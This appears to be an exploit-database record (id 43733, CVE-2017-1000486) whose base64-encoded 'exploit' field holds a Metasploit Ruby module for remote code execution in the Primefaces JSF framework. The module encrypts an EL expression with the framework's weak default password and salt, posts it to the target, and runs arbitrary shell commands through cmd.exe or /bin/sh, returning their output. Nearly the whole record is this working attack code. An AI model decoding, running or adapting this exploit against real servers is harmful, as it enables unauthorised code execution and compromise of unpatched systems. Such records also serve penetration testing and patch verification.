{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cHM6Ly9tZXRhc3Bsb2l0LmNvbS9kb3dubG9hZA0KIyBDdXJyZW50IHNvdXJjZTogaHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yaw0KIyMNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBOb3JtYWxSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6VGNwDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCiAgZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KICAgIHN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQogICAgJ05hbWUnICAgICAgICAgICA9PiAnQ1ZFLTIwMTctMTAwMDQ4NiBQcmltZWZhY2VzIFJlbW90ZSBDb2RlIEV4ZWN1dGlvbiBFeHBsb2l0JywNCiAgICAnRGVzY3JpcHRpb24nICAgID0+ICVxew0KICAgICAgICAgIFRoaXMgbW9kdWxlIGV4cGxvaXRzIGFuIGV4cHJlc3Npb24gbGFuZ3VhZ2UgcmVtb3RlIGNvZGUgZXhlY3V0aW9uIGZsYXcgaW4gdGhlIFByaW1lZmFjZXMgSlNGIGZyYW1ld29yay4NCiAgICAgICAgICBQcmltZWZhY2VzIHZlcnNpb25zIHByaW9yIHRvwqA1LjIuMjEsIDUuMy44IG9yIDYuMCBhcmUgdnVsbmVyYWJsZSB0byBhIHBhZGRpbmcgb3JhY2xlIGF0dGFjaywgZHVlIHRvIHRoZSB1c2Ugb2Ygd2VhayBjcnlwdG8gYW5kIGRlZmF1bHQgZW5jcnlwdGlvbiBwYXNzd29yZCBhbmQgc2FsdC4NCiAgfSwNCiAgICAnQXV0aG9yJyAgICAgICAgID0+IFsgJ0Jqb2VybiBTY2h1ZXR0ZScgXSwNCiAgICAnTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICdSZWZlcmVuY2VzJyAgICAgPT4NCiAgICBbDQogICAgICBbJ0NWRScsICdDVkUtMjAxNy0xMDAwNDg2J10sDQogICAgICBbJ1VSTCcsICdodHRwOi8vYmxvZy5taW5kZWRzZWN1cml0eS5jb20vMjAxNi8wMi9yY2UtaW4tb3JhY2xlLW5ldGJlYW5zLW9wZW5zb3VyY2UuaHRtbCddLA0KICAgICAgWydVUkwnLCAnaHR0cHM6Ly9jcnlwdG9zZW5zZS5jb20vd2Vhay1lbmNyeXB0aW9uLWZsYXctaW4tcHJpbWVmYWNlcy8nXSwNCiAgICAgIFsnVVJMJywgJ2h0dHA6Ly9zY2h1ZXR0ZS5zZS8yMDE4LzAxLzE2L2luLXlvdXItcHJpbWVmYWNlLyddDQogICAgXSwNCiAgICAnUHJpdmlsZWdlZCcgICAgID0+IHRydWUsDQogICAgJ1BheWxvYWQnICAgICAgICA9Pg0KICAgIHsNCiAgICAgICdDb21wYXQnICAgICAgPT4NCiAgICAgIHsNCiAgICAgICdQYXlsb2FkVHlwZScgPT4gJ2NtZCcNCiAgICAgIH0NCg0KICAgIH0sDQogICAgJ0RlZmF1bHRPcHRpb25zJyA9Pg0KICAgIHsNCiAgICAgICdXZnNEZWxheScgPT4gMzANCiAgICB9LA0KICAgICdEaXNjbG9zdXJlRGF0ZScgPT4gJ0ZlYiAxNSAyMDE2JywNCiAgICAnUGxhdGZvcm0nICAgICAgID0+IFsndW5peCcsICdic2QnLCAnbGludXgnLCAnb3N4JywgJ3dpbiddLA0KICAgICdBcmNoJyAgICAgICAgICAgPT4gQVJDSF9DTUQsDQogICAgJ1RhcmdldHMnICAgICAgICA9PiBbDQogICAgICBbDQogICAgICAnVW5pdmVyc2FsJywgew0KICAgICAgJ1BsYXRmb3JtJyAgID0+IFsndW5peCcsICdic2QnLCAnbGludXgnLCAnb3N4JywgJ3dpbiddLA0KICAgICAgJ0FyY2gnICAgICAgID0+IFsgQVJDSF9DTUQgXSwNCiAgICAgIH0sDQogICAgICBdLA0KICAgIF0sDQogICAgJ0RlZmF1bHRUYXJnZXQnID0+IDApKQ0KDQogICAgcmVnaXN0ZXJfb3B0aW9ucyhbDQogICAgICBPcHQ6OlJQT1JUKDgwKSwNCiAgICAgIE9wdFN0cmluZy5uZXcoJ1BBU1NXT1JEJywgWyB0cnVlICwgIlRoZSBwYXNzd29yZCB0byBsb2dpbiIsICdwcmltZWZhY2VzJ10pLA0KICAgICAgT3B0U3RyaW5nLm5ldygnVEFSR0VUVVJJJywgW3RydWUsICdUaGUgYmFzZSBwYXRoIHRvIHByaW1lZmFjZXMnLCAnL2phdmF4LmZhY2VzLnJlc291cmNlL2R5bmFtaWNjb250ZW50LnByb3BlcnRpZXMueGh0bWwnXSkgICwNCiAgICAgIE9wdFN0cmluZy5uZXcoJ0NNRCcsIFsgZmFsc2UgLCAiQ29tbWFuZCB0byBleGVjdXRlIiwgJyddKSwNCiAgICBdKQ0KICBlbmQNCg0KICBkZWYgZW5jcnlwdF9lbChwYXNzd29yZCwgcGF5bG9hZCkNCg0KICAgIHNhbHQgPSBbMHhhOSwgMHg5YiwgMHhjOCwgMHgzMiwgMHg1NiwgMHgzNCwgMHhlMywgMHgwM10ucGFjaygnYyonKQ0KICAgIGl0ZXJhdGlvbkNvdW50ID0gMTkNCg0KICAgIGNpcGhlciA9IE9wZW5TU0w6OkNpcGhlci5uZXcoIkRFUyIpDQogICAgY2lwaGVyLmVuY3J5cHQNCiAgICBjaXBoZXIucGtjczVfa2V5aXZnZW4gcGFzc3dvcmQsIHNhbHQsIGl0ZXJhdGlvbkNvdW50DQoNCiAgICBjaXBoZXJ0ZXh0ID0gY2lwaGVyLnVwZGF0ZSBwYXlsb2FkDQogICAgY2lwaGVydGV4dCA8PCBjaXBoZXIuZmluYWwNCiAgICByZXR1cm4gY2lwaGVydGV4dA0KDQogIGVuZA0KDQogIGRlZiBodHRwX3NlbmRfY29tbWFuZChjbWQsIHBheWxvYWRFTCkNCiAgICB1cmkgPSBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCkNCiAgICBlbmNyeXB0ZWRfcGF5bG9hZCA9IGVuY3J5cHRfZWwoZGF0YXN0b3JlWydQQVNTV09SRCddLCBwYXlsb2FkRUwpDQogICAgZW5jcnlwdGVkX3BheWxvYWRfYmFzZTY0ID0gUmV4OjpUZXh0LmVuY29kZV9iYXNlNjQoZW5jcnlwdGVkX3BheWxvYWQpDQogICAgZW5jcnlwdGVkX3BheWxvYWRfYmFzZTY0X3VybF9lbmNvZGVkID0gUmV4OjpUZXh0LnVyaV9lbmNvZGUoZW5jcnlwdGVkX3BheWxvYWRfYmFzZTY0KQ0KDQogICAgIyBzZW5kIHRoZSBwYXlsb2FkIGFuZCBleGVjdXRlIGNvbW1hbmQNCiAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCiAgICAgICdtZXRob2QnID0+ICdQT1NUJywNCiAgICAgICd1cmknID0+IHVyaSwNCiAgICAgICd2YXJzX3Bvc3QnID0+IHsNCiAgICAgICdwZmRydCcgPT4gJ3NjJywNCiAgICAgICdsbicgID0+ICdwcmltZWZhY2VzJywNCiAgICAgICdwZmRyaWQnID0+IGVuY3J5cHRlZF9wYXlsb2FkX2Jhc2U2NF91cmxfZW5jb2RlZA0KICAgICAgfQ0KICAgIH0pDQoNCiAgICBpZiByZXMubmlsPw0KICAgICAgdnByaW50X2Vycm9yKCJDb25uZWN0aW9uIHRpbWVkIG91dCIpDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5rbm93biwgIkZhaWxlZCB0byB0cmlnZ2VyIHRoZSBFbnRlciBidXR0b24iKQ0KICAgIGVuZA0KDQogICAgaWYgcmVzICYmIHJlcy5oZWFkZXJzICYmIChyZXMuY29kZSA9PSAzMDIgfHwgcmVzLmNvZGUgPT0gMjAwKQ0KICAgICAgcHJpbnRfZ29vZCgiSFRUUCByZXR1cm4gY29kZSAje3Jlcy5jb2RlfSIpDQogICAgZWxzZQ0KICAgICAgdnByaW50X2Vycm9yKHJlcy5ib2R5KQ0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OlVua25vd24sICIje3BlZXJ9IC0gVW5rbm93biBlcnJvciBkdXJpbmcgZXhlY3V0aW9uIikNCiAgICBlbmQNCiAgICByZXR1cm4gcmVzDQogIGVuZA0KDQogIGRlZiBleHBsb2l0DQogICAgY21kPSIiDQogICAgaWYgbm90IGRhdGFzdG9yZVsnQ01EJ10uZW1wdHk/DQogICAgICBjbWQgPSBkYXRhc3RvcmVbJ0NNRCddDQogICAgZWxzZQ0KICAgICAgY21kID0gcGF5bG9hZC5lbmNvZGVkDQogICAgZW5kDQogICAgcGF5bG9hZEVMID0gJyR7ZmFjZXNDb250ZXh0LmdldEV4dGVybmFsQ29udGV4dCgpLmdldFJlc3BvbnNlKCkuc2V0Q29udGVudFR5cGUoInRleHQvcGxhaW47Y2hhcnNldD0iVVRGLTgiIil9Jw0KICAgIHBheWxvYWRFTCA8PCAnJHtzZXNzaW9uLnNldEF0dHJpYnV0ZSgic2NyaXB0ZmFjdG9yeSIsIiIuZ2V0Q2xhc3MoKS5mb3JOYW1lKCJqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlciIpLm5ld0luc3RhbmNlKCkpfScNCiAgICBwYXlsb2FkRUwgPDwgJyR7c2Vzc2lvbi5zZXRBdHRyaWJ1dGUoInNjcmlwdGVuZ2luZSIsc2Vzc2lvbi5nZXRBdHRyaWJ1dGUoInNjcmlwdGZhY3RvcnkiKS5nZXRFbmdpbmVCeU5hbWUoIkphdmFTY3JpcHQiKSl9Jw0KICAgIHBheWxvYWRFTCA8PCAnJHtzZXNzaW9uLmdldEF0dHJpYnV0ZSgic2NyaXB0ZW5naW5lIikuZ2V0Q29udGV4dCgpLnNldFdyaXRlcihmYWNlc0NvbnRleHQuZ2V0RXh0ZXJuYWxDb250ZXh0KCkuZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSl9Jw0KICAgIHBheWxvYWRFTCA8PCAnJHtzZXNzaW9uLmdldEF0dHJpYnV0ZSgic2NyaXB0ZW5naW5lIikuZXZhbCgnDQogICAgcGF5bG9hZEVMIDw8ICcidmFyIG9zID0gamF2YS5sYW5nLlN5c3RlbS5nZXRQcm9wZXJ0eSgib3MubmFtZSIpOycNCiAgICBwYXlsb2FkRUwgPDwgJ3ZhciBwcm9jID0gbnVsbDsnDQogICAgcGF5bG9hZEVMIDw8ICdvcy50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKCJ3aW4iKT8gJw0KICAgIHBheWxvYWRFTCA8PCAncHJvYyA9IG5ldyBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXJbIihqYXZhLmxhbmcuU3RyaW5nW10pIl0oWyJjbWQuZXhlIiwiL0MiLCIlcyJdKS5zdGFydCgpJyAlIGNtZA0KICAgIHBheWxvYWRFTCA8PCAnIDogcHJvYyA9IG5ldyBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXJbIihqYXZhLmxhbmcuU3RyaW5nW10pIl0oWyIvYmluL3NoIiwiLWMiLCIlcyJdKS5zdGFydCgpOycgJSBjbWQNCiAgICBwYXlsb2FkRUwgPDwgJ3ZhciBpcyA9IHByb2MuZ2V0SW5wdXRTdHJlYW0oKTsnDQogICAgcGF5bG9hZEVMIDw8ICd2YXIgc2MgPSBuZXcgamF2YS51dGlsLlNjYW5uZXIoaXMsIlVURi04Iik7IHZhciBvdXQgPSAiIjsnDQogICAgcGF5bG9hZEVMIDw8ICd3aGlsZShzYy5oYXNOZXh0KCkpIHtvdXQgKz0gc2MubmV4dExpbmUoKStTdHJpbmcuZnJvbUNoYXJDb2RlKDEwKTt9cHJpbnQob3V0KTsiKX0nDQogICAgcGF5bG9hZEVMIDw8ICcke2ZhY2VzQ29udGV4dC5nZXRFeHRlcm5hbENvbnRleHQoKS5nZXRSZXNwb25zZSgpLmdldFdyaXRlcigpLmZsdXNoKCl9Jw0KICAgIHBheWxvYWRFTCA8PCAnJHtmYWNlc0NvbnRleHQuZ2V0RXh0ZXJuYWxDb250ZXh0KCkuZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKS5jbG9zZSgpfSc7DQoNCiAgICB2cHJpbnRfc3RhdHVzKCJBdHRlbXB0aW5nIHRvIGV4ZWN1dGU6ICN7Y21kfSIpDQogICAgcmVzcCA9IGh0dHBfc2VuZF9jb21tYW5kKGNtZCwgcGF5bG9hZEVMKQ0KICAgIHByaW50X2xpbmUocmVzcC5ib2R5LnRvX3MpDQogICAgbSA9IHJlc3AuYm9keS50b19zIA0KICAgIGlmIG0uZW1wdHk/DQogICAgICBwcmludF9lcnJvcigiVGhpcyBzZXJ2ZXIgbWF5IG5vdCBiZSB2dWxuZXJhYmxlIikNCiAgICBlbmQNCiAgICByZXR1cm4NCiAgZW5kDQoNCiAgZGVmIGNoZWNrDQogICAgdmFyX2EgPSByYW5kX3RleHRfYWxwaGFfbG93ZXIoNCkNCiAgICBwYXlsb2FkRUwgPSAiJHtmYWNlc0NvbnRleHQuZ2V0RXh0ZXJuYWxDb250ZXh0KCkuc2V0UmVzcG9uc2VIZWFkZXIoInByaW1lc2VjcmV0Y2hrIiwgJXMiICUgdmFyX2ENCiAgICByZXMgPSBodHRwX3NlbmRfY29tbWFuZCh2YXJfYSwgcGF5bG9hZEVMKQ0KICAgIGlmIHJlcy5oZWFkZXJzDQogICAgICBpZiByZXMuaGVhZGVyc1sicHJpbWVzZWNyZXRjaGsiXSA9PSAje3Zhcl9hfQ0KICAgICAgICB2cHJpbnRfZ29vZCgiVmljdGltIGV2YWx1YXRlcyBFTCBleHByZXNzaW9ucyIpDQogICAgICAgIHJldHVybiBFeHBsb2l0OjpDaGVja0NvZGU6OlZ1bG5lcmFibGUNCiAgICAgIGVuZA0KICAgIGVsc2UNCiAgICAgIHZwcmludF9lcnJvcigiVW5hYmxlIHRvIGRldGVybWluZSBkdWUgdG8gYSBIVFRQIGNvbm5lY3Rpb24gdGltZW91dCIpDQogICAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpVbmtub3duDQogICAgZW5kDQogICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6U2FmZQ0KICBlbmQNCg0KZW5k", 
    "id": "43733", 
    "cves": [
        "CVE-2017-1000486"
    ]
}